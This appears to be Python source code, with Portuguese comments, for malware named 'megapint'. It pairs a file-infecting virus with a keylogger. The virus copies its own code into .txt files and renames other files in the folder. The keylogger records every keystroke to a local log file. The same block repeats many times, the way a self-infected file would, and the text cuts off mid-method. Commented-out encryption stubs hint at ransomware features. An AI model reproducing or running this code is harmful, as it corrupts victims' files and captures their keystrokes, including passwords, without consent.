    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
